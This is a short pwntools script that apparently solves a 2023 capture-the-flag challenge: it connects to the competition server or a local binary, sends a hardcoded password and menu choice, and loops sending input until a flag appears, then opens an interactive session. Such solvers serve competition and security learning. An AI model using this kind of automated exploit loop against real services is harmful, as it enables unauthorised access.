#!/usr/bin/python3

from pwn import *

exe = ELF('chal', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: r.sendlineafter(msg, data)
sa = lambda msg, data: r.sendafter(msg, data)
sl = lambda data: r.sendline(data)
s = lambda data: r.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    gdb.attach(r, gdbscript='''
        
        
        c
    ''')

while 1:
    if args.REMOTE:
        r = remote('gradebook.2023.ctfcompetition.com', 1337)
    else:
        r = process(exe.path)
        GDB()

    sla(b'PASSWORD:', b'pencil')
    sla(b'QUIT\n\n', b'1337')
    out = b''
    i = 0
    while b'*BAM!*' not in out:
        sl(b'a')
        out = r.recv()
        i+=1
        if b'CTF' in out:
            r.interactive()
    print(i)
    r.close()
# r.recv()

